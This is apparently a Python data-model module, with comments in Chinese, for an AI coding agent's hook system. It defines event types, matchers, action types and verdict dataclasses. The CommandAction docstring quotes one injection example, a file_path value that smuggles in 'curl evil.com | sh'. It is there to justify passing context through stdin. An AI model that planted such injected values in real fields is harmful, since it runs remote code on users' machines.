"""
Hook 系统的纯数据层：只定义枚举、常量表与 dataclass，不含任何行为逻辑（c12 plan「models.py」）。

设计目的（与 `agent/events.py`、`permission/models.py` 同思路）：
- 让条件求值（conditions）、规则解析（parser）、动作执行（actions）、编排（manager）
  共享同一套轻量类型，彼此通过这些数据结构通信，避免互相依赖具体实现而形成耦合或循环引用。
- 所有结构都是「值对象」：构造后即可被纯函数读取、断言，便于单元测试（spec N5）。

这些类型贯穿一次 Hook 分发的全过程：

    生命周期节点 → HookPayload（负载）
                 → Condition.evaluate（筛出命中规则）
                 → HookAction 执行 → ActionOutcome（单条结果）
                 → 合并 → HookVerdict（本次结论）→ DispatchResult

本模块**零 I/O、零依赖**（只用标准库），是 `hooks` 包里最底层的一块。
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional, Pattern, Union

# ---------------------------------------------------------------------------
# 事件
# ---------------------------------------------------------------------------


class HookEventType(str, Enum):
    """
    十二个生命周期事件（spec F2），分五组。

    继承 str 便于直接和字符串比较、打印调试，也让它能直接作为 YAML 里写的事件名
    （与 `AgentEventType` / `TraceEventType` 同风格）。

    **会话级**
    - SESSION_START / SESSION_END：一次会话的起止（含 `/clear`、`/resume` 造成的切换）

    **回合级**（一个「回合」= 一次完整的 Agent Loop 运行）
    - TURN_START / TURN_END：主对话与子对话都触发，由负载里的 `scope` 区分

    **消息级**
    - USER_MESSAGE：用户在输入框提交一条消息（**含斜杠命令**）
    - ASSISTANT_MESSAGE：一段 AI 正文产出完毕，一个回合内可能多次

    **工具级**
    - PRE_TOOL_USE：**唯一可拦截的事件**（spec F6）
    - POST_TOOL_USE / POST_TOOL_USE_FAILURE：工具**真的执行了**之后，按 ok 分流

    **系统级**
    - PRE_COMPACT / POST_COMPACT：C8 的 LLM 摘要压缩前后
    - NOTIFICATION：系统需要用户注意时

    ⚠ **成对维护点**：新增事件须同步三处——本枚举、下方的 `EVENT_FIELDS`、
    以及该事件的负载构造点。**漏改 `EVENT_FIELDS` 不报错**，只是用户在条件里
    写对了字段名反而被判为非法、整条规则被丢弃——用户会以为是自己写错了。
    """

    SESSION_START = "session_start"
    SESSION_END = "session_end"
    TURN_START = "turn_start"
    TURN_END = "turn_end"
    USER_MESSAGE = "user_message"
    ASSISTANT_MESSAGE = "assistant_message"
    PRE_TOOL_USE = "pre_tool_use"
    POST_TOOL_USE = "post_tool_use"
    POST_TOOL_USE_FAILURE = "post_tool_use_failure"
    PRE_COMPACT = "pre_compact"
    POST_COMPACT = "post_compact"
    NOTIFICATION = "notification"


# 每个事件负载都带的三个公共字段（spec F2 开头）。
#
# ⚠ 它们对 `tool_input` 展开具有**优先权**：工具参数里若恰好也叫 `cwd`，
# 展开时不覆盖公共字段（spec F3.2）。这条在负载构造点实现，此处只是登记来源。
COMMON_FIELDS: frozenset[str] = frozenset({"event", "session_id", "cwd"})


def _fields(*names: str) -> frozenset[str]:
    """把公共字段与事件专有字段合成一个只读集合（仅本模块内用于压缩 EVENT_FIELDS 的书写）。"""
    return COMMON_FIELDS | frozenset(names)


# ---------------------------------------------------------------------------
# 字段表
# ---------------------------------------------------------------------------

# 事件 → 该事件负载的**静态可知**字段名全集（spec F2 的表 + 三个公共字段）。
#
# 两处用它：
# ① `parser` 校验条件里写的字段名是否属于该事件（spec F8 第 4 项）；
# ② 负载构造点用它作为「该填哪些字段」的依据。
#
# 「静态可知」是关键限定——见下方 OPEN_INPUT_EVENTS 的说明。
EVENT_FIELDS: dict[HookEventType, frozenset[str]] = {
    # 会话级
    HookEventType.SESSION_START: _fields("source"),
    HookEventType.SESSION_END: _fields("reason"),
    # 回合级
    HookEventType.TURN_START: _fields("scope", "trigger"),
    HookEventType.TURN_END: _fields("scope", "stop_reason", "last_text"),
    # 消息级
    HookEventType.USER_MESSAGE: _fields("text", "is_command"),
    HookEventType.ASSISTANT_MESSAGE: _fields("scope", "text"),
    # 工具级（字段集是**开放**的，见 OPEN_INPUT_EVENTS）
    HookEventType.PRE_TOOL_USE: _fields(
        "tool", "tool_call_id", "is_read_only", "scope"
    ),
    HookEventType.POST_TOOL_USE: _fields(
        "tool", "tool_call_id", "is_read_only", "scope", "tool_output", "duration_ms"
    ),
    HookEventType.POST_TOOL_USE_FAILURE: _fields(
        "tool",
        "tool_call_id",
        "is_read_only",
        "scope",
        "tool_output",
        "duration_ms",
        "error",
    ),
    # 系统级
    HookEventType.PRE_COMPACT: _fields("trigger", "message_count"),
    HookEventType.POST_COMPACT: _fields("trigger", "message_count", "ok"),
    HookEventType.NOTIFICATION: _fields("kind", "message"),
}

# 字段集**开放**的事件：这三个的负载会把 `tool_input`（模型生成的工具参数对象）
# 里的每个键逐字展开成顶层字段名（spec F3.2），因此可用字段取决于「调的是哪个工具」——
# `run_command` 给出 `command`，`edit_file` 给出 `file_path` / `old_string` / `new_string`，
# MCP 工具则给出远端定义的任意参数名。
#
# **加载期不可能枚举它们**，所以对这三个事件，`parser` 的字段名校验必须放行未登记的名字。
#
# 代价要说清楚：`fil_path` 这样的笔误在这三个事件上**不会被加载期发现**，
# 只会表现为「这条规则永远不命中」。这是开放字段集的必然代价，不是疏漏——
# 唯一的替代方案是维护一份「全部工具的全部参数名」清单，而它会在每次新增工具、
# 每次接入新 MCP Server 时过期，且过期后的表现是**误报合法字段为笔误**（更糟）。
# 排查手段是 `/hooks` 报告里的触发次数统计：写错字段的规则触发次数恒为 0。
OPEN_INPUT_EVENTS: frozenset[HookEventType] = frozenset(
    {
        HookEventType.PRE_TOOL_USE,
        HookEventType.POST_TOOL_USE,
        HookEventType.POST_TOOL_USE_FAILURE,
    }
)

# 字段名 → glob 形态下该用哪种匹配算法（spec F3.3）。
#
# 未登记的字段走 `"plain"`（通用 fnmatch）。登记在这里的字段能拿到与权限规则
# **完全一致**的匹配语义，用户在 `permissions.yaml` 里学到的写法可以直接搬过来：
# - `"command"` → `permission.matching.match_command`（前缀 + 词边界，`git *` 不命中 `github-cli`）
# - `"path"`    → `permission.matching.match_path`（gitignore 风格，`**/*.py` 跨层匹配）
#
# ⚠ **成对维护点**：新增可 glob 匹配的字段要登记进本表。**漏改不报错**，
# 只是该字段从「命令/路径语义匹配」悄悄退化成通用通配——词边界语义丢失后
# `git *` 会连 `github-cli` 一起命中，而配置和界面上都看不出任何异常。
FIELD_MATCH_KIND: dict[str, str] = {
    # 命令类
    "command": "command",
    # 路径类。`pattern` 是 glob_files 的模式参数，`path` 是若干工具的通用路径参数。
    "file_path": "path",
    "path": "path",
    "pattern": "path",
    "cwd": "path",
}

MATCH_KIND_PLAIN = "plain"


# ---------------------------------------------------------------------------
# 条件
# ---------------------------------------------------------------------------

# 匹配形态的三个取值（Matcher.kind）。写成常量而非字面量，避免各处拼错字符串。
MATCHER_EXACT = "exact"
MATCHER_GLOB = "glob"
MATCHER_REGEX = "regex"

# 逻辑组合词的两个取值（Condition.combine）。spec F3.1：二选一，不混用、不嵌套。
COMBINE_ALL = "all"
COMBINE_ANY = "any"


@dataclass(frozen=True)
class Matcher:
    """
    一条「字段 = 模式」的匹配项，即 `if.all` / `if.any` 列表里的一个元素。

    :param field: 条件左侧的字段名（取自事件负载）
    :param negated: 原始值是否以 `!` 开头（反向匹配）
    :param kind: 匹配形态，三个 MATCHER_* 常量之一
    :param pattern: 去掉 `!` 前缀与正则包裹之后的模式原文
    :param regex: 仅 kind 为 MATCHER_REGEX 时非 None，**加载期已编译**

    **为什么形态与正则都在加载期定好**：求值发生在每一次事件分发上（`pre_tool_use`
    的话就是每一次工具调用），把「判形态」和「编译正则」留到求值期意味着重复做
    成千上万次纯粹的解析工作。加载期做掉还顺带完成了 spec F8 第 5 项校验
    （正则编译不过就是加载期错误，用户立刻知道，而不是等到某次事件触发时才失败）。

    frozen=True：规则一旦解析出来就不该被改写。
    """

    field: str
    negated: bool
    kind: str
    pattern: str
    regex: Optional[Pattern[str]] = None


@dataclass(frozen=True)
class Condition:
    """
    一条规则的条件表达式（spec F3）。

    :param combine: 逻辑组合词，COMBINE_ALL（全部满足）或 COMBINE_ANY（任一满足）
    :param matchers: 匹配项元组；**加载期保证非空**

    规则的 `if` 被省略时，`HookRule.condition` 为 None（而不是一个空 Condition）——
    「无条件」与「条件为空列表」在语义上不同，用 None 表达能避免 `all([])` 恒真、
    `any([])` 恒假这种要靠记忆才能推断的行为泄漏到规则层。
    """

    combine: str
    matchers: tuple[Matcher, ...]


# ---------------------------------------------------------------------------
# 动作
# ---------------------------------------------------------------------------

# 动作类型的四个取值（YAML 里 `action.type` 的合法值）。
ACTION_COMMAND = "command"
ACTION_PROMPT = "prompt"
ACTION_HTTP = "http"
ACTION_AGENT = "agent"

ACTION_TYPES: tuple[str, ...] = (ACTION_COMMAND, ACTION_PROMPT, ACTION_HTTP, ACTION_AGENT)

# 两类动作的缺省超时（秒，spec F4）。
# 命令给得宽（格式化、测试都可能跑很久），HTTP 给得紧（通知类请求不该拖住流程）。
DEFAULT_COMMAND_TIMEOUT = 60
DEFAULT_HTTP_TIMEOUT = 10


@dataclass(frozen=True)
class CommandAction:
    """
    执行 shell 命令（spec F4.1）。

    :param command: 命令串，**逐字执行**——配置里不做任何字符串插值（spec N3）
    :param timeout: 超时秒数

    上下文只经**标准输入的 JSON**抵达命令（spec 决策 3B）。这条不是风格选择：
    做插值的话，模型生成的工具参数会被拼进 shell 命令行，一个
    `file_path = "a.py; curl evil.com | sh"` 就能让分号后半截跑在用户机器上，
    而它**不经五层权限管线**（那不是工具调用，是 Hook 自己执行的命令）。
    """

    command: str
    timeout: int = DEFAULT_COMMAND_TIMEOUT


@dataclass(frozen=True)
class PromptAction:
    """
    注入提示词（spec F4.2）。

    :param text: 要注入 `<system-reminder>` 的文本

    **一次性**：被带上一次 API 请求后即清除（由 manager 的 `consume_injections` 保证）。
    持续注入会让提醒无限增长，且用户无法预期它什么时候消失。
    """

    text: str


@dataclass(frozen=True)
class HttpAction:
    """
    发 HTTP 请求（spec F4.3）。

    :param url: 目标地址，发请求前过②′网络边界层的**结构性硬校验**
    :param method: HTTP 方法，缺省 POST
    :param headers: 自定义请求头
    :param body: 请求体；None 表示发送完整事件负载 JSON
    :param timeout: 超时秒数

    **本动作不参与任何拦截决策**——响应状态码与响应体只进 trace。让一个外部服务
    能决定本地工具跑不跑，可用性与安全性都不成立。

    注意 `headers` 用 `tuple[tuple[str, str], ...]` 而不是 dict：本类 frozen=True
    要可哈希，而 dict 不可哈希。解析层负责把 YAML 映射转成有序元组对。
    """

    url: str
    method: str = "POST"
    headers: tuple[tuple[str, str], ...] = ()
    body: Optional[str] = None
    timeout: int = DEFAULT_HTTP_TIMEOUT


@dataclass(frozen=True)
class AgentAction:
    """
    启动子 Agent（spec F4.4，**本章占位**）。

    :param prompt: 交给子 Agent 的提示词

    加载期完成字段校验，运行期**不执行**，只产出一条「尚未支持」的说明。
    等 SubAgent 章节接入后再补真实运行。
    """

    prompt: str


# 四种动作的联合类型。用 Union 而非公共基类：它们没有共同行为，
# 执行分派在 `actions.py` 里按 isinstance 做，加基类只会多一层没有内容的抽象。
HookAction = Union[CommandAction, PromptAction, HttpAction, AgentAction]


# ---------------------------------------------------------------------------
# 规则
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class HookRule:
    """
    一条解析后的 Hook 规则（spec F1 的三要素 + F5 的三个执行控制）。

    :param name: 人类可读标识。用户显式写的 `name`，或缺省生成的 `"<来源层>#<层内序号>"`。
                 三处用它：`/hooks` 报告、trace 记录、拦截原因文案
    :param source: 来源层，`"user"` 或 `"project"`。仅用于展示与项目级提示的筛选，
                   **不参与优先级**（spec F9：两层规则全部生效，不按层级覆盖）
    :param index: 层内声明序，决定执行顺序（spec F9：用户级 → 项目级 → 层内声明序）
    :param event: 触发时刻
    :param condition: 条件；None 表示无条件触发
    :param action: 动作
    :param once: 为真时该规则在**本次进程运行内**只触发一次。**不持久化**，重启即重置
    :param run_async: 为真时动作在后台线程执行、不等结果。
                      `pre_tool_use` 上禁止为真（加载期校验，spec F5）

    **字段名是 `run_async` 而不是 `async`**——后者是 Python 关键字，做不了标识符。
    YAML 里用户仍然写 `async: true`，解析层负责这次改名。

    frozen=True 使其不可变且可哈希：规则一旦从配置解析出来就不应被改写。
    **`once` 的「已消耗」状态刻意不放在这里**，而是存在 `HookManager` 内部——
    那是「本次运行」的状态，不属于「规则定义」。
    """

    name: str
    source: str
    index: int
    event: HookEventType
    condition: Optional[Condition]
    action: HookAction
    once: bool = False
    run_async: bool = False

    @property
    def key(self) -> str:
        """
        本规则在一次运行内的**唯一键**，用于 `once` 消耗标记与执行统计。

        ⚠ **不能用 `name` 当键**：`name` 是用户随手写的展示名，同一份配置里
        完全可能出现两条重名规则（复制粘贴改一半是常态）。用它做键的话，
        一条 `once` 规则触发后会把另一条同名规则也一并「消耗」掉，
        而两条规则在界面上看起来都还在——**漏改不报错，只是有一条永远不跑**。

        `source` + `index` 由加载顺序唯一确定，天然不会重复。
        """
        return f"{self.source}#{self.index}"


# ---------------------------------------------------------------------------
# 负载
# ---------------------------------------------------------------------------


@dataclass
class HookPayload:
    """
    一次事件分发的负载。

    :param event: 事件类型
    :param fields: 字段字典——三个公共字段 + 事件专有字段 +（工具级事件）`tool_input` 逐字展开

    两处消费它：条件求值（读 `fields`）与动作执行（序列化成 JSON 喂给命令 / 作为 HTTP 请求体）。

    **不是 frozen**：负载是「这一次事件的事实快照」，构造后就地传递、不共享、不缓存，
    加不可变约束只会让构造点被迫多写一次 dict 拷贝。
    """

    event: HookEventType
    fields: dict[str, Any] = field(default_factory=dict)


# ---------------------------------------------------------------------------
# 结论
# ---------------------------------------------------------------------------


class HookDecision(str, Enum):
    """
    一次 Hook 判定的三种结论（spec F6.1）。

    **没有第四种，尤其没有 ALLOW。** Hook 无法让任何调用跳过五层权限管线中的任何一层——
    这是决策 1A 的全部内容，也是本章安全论证的唯一依据：Hook 加进来之后，
    「能通过的调用集合」只会变小，不会变大，因此 C6 建立的一切不变量原样成立。

    - DENY：拦截。不执行，把结构化原因回灌模型（**不终止 Agent Loop**）
    - ASK：升级为人在回路确认。**只能把 ALLOW 升级为 ASK，不能把 DENY 降级**
    - NONE：不表态。原样进入五层，行为与没有这条 Hook 完全一致
    """

    DENY = "deny"
    ASK = "ask"
    NONE = "none"


# 结论的「严格程度」序，供多条 Hook 命中同一次调用时取最严（spec F6.2）。
#
# ⚠ **成对维护点**：新增 HookDecision 取值须同步本表。漏改会在合并时抛 KeyError——
# 好在那是当场可见的崩溃，不是静默错误。
SEVERITY: dict[HookDecision, int] = {
    HookDecision.NONE: 0,
    HookDecision.ASK: 1,
    HookDecision.DENY: 2,
}


@dataclass(frozen=True)
class HookVerdict:
    """
    一次事件分发合并后的最终结论。

    :param decision: 三种结论之一
    :param reason: 面向**模型**的中文原因（会作为工具结果回灌）
    :param rule_name: 做出该结论的规则标识；`decision` 为 NONE 时为空串
    """

    decision: HookDecision
    reason: str = ""
    rule_name: str = ""


# 「无结论」的共享单例。frozen dataclass 可安全共享，不必每次构造。
NO_VERDICT = HookVerdict(HookDecision.NONE)


@dataclass(frozen=True)
class ActionOutcome:
    """
    单条动作的执行结果。

    :param ok: **动作自身**是否成功执行完毕。注意它与拦截结论是两码事——
               一个成功跑完并明确判 DENY 的 Hook，`ok` 是 True、`verdict` 是 DENY
    :param verdict: 该动作产出的结论；非 `pre_tool_use` 事件上恒为 NONE
    :param reason: 结论原因（`verdict` 非 NONE 时有意义）
    :param detail: stdout / stderr / 响应状态的摘要。**这一份可能被裁剪**，
                   因为失败路径上它会经 `HOOK_FAILED_REASON` 回灌给模型
                   （见 `manager.py`），无上限会让一条刷屏的 Hook 撑爆上下文
    :param full_detail: 同一份内容的**完整原文，只进行为记录（trace）**。
                   缺省 None 表示「`detail` 就是全部」。
                   ⚠️ 与 `ToolResult.full_output` 同一个约定、同一个坑：
                   **裁剪 `detail` 与填 `full_detail` 必须成对**，漏填不报错，
                   只是那段输出永久消失。Hook 的 stdout 恰恰是排查
                   「我的自动化到底跑出了什么」唯一的证据
    :param duration_ms: 执行耗时（毫秒，保留三位小数）
    :param injected_text: `prompt` 动作的产物，其余动作为空串

    **`ok` 与 `verdict` 必须分开**：spec F7.1 的 fail-closed 判据是「`ok` 为假」，
    而不是「`verdict` 为 DENY」。混成一个字段会让「Hook 成功运行并放行」与
    「Hook 崩了」无法区分，前者该继续、后者该拦截。
    """

    ok: bool
    verdict: HookDecision = HookDecision.NONE
    reason: str = ""
    detail: str = ""
    full_detail: Optional[str] = None
    duration_ms: float = 0.0
    injected_text: str = ""


@dataclass(frozen=True)
class DispatchResult:
    """
    一次事件分发的整体结果，是 `HookManager.dispatch` 的返回值。

    :param verdict: 合并后的结论；无规则命中时为 NO_VERDICT
    :param matched: 条件求值后命中的规则数
    :param executed: 实际执行的动作数（扣除 `once` 已消耗而跳过的）

    后两个字段只用于 trace 与 `/hooks` 统计，不参与任何决策。
    """

    verdict: HookVerdict = NO_VERDICT
    matched: int = 0
    executed: int = 0


# 「什么都没发生」的共享单例，供 `has_listeners` 为假时零成本返回。
EMPTY_DISPATCH = DispatchResult()


__all__ = [
    # 事件
    "HookEventType",
    "COMMON_FIELDS",
    "EVENT_FIELDS",
    "OPEN_INPUT_EVENTS",
    "FIELD_MATCH_KIND",
    "MATCH_KIND_PLAIN",
    # 条件
    "Matcher",
    "Condition",
    "MATCHER_EXACT",
    "MATCHER_GLOB",
    "MATCHER_REGEX",
    "COMBINE_ALL",
    "COMBINE_ANY",
    # 动作
    "CommandAction",
    "PromptAction",
    "HttpAction",
    "AgentAction",
    "HookAction",
    "ACTION_COMMAND",
    "ACTION_PROMPT",
    "ACTION_HTTP",
    "ACTION_AGENT",
    "ACTION_TYPES",
    "DEFAULT_COMMAND_TIMEOUT",
    "DEFAULT_HTTP_TIMEOUT",
    # 规则与负载
    "HookRule",
    "HookPayload",
    # 结论
    "HookDecision",
    "SEVERITY",
    "HookVerdict",
    "NO_VERDICT",
    "ActionOutcome",
    "DispatchResult",
    "EMPTY_DISPATCH",
]
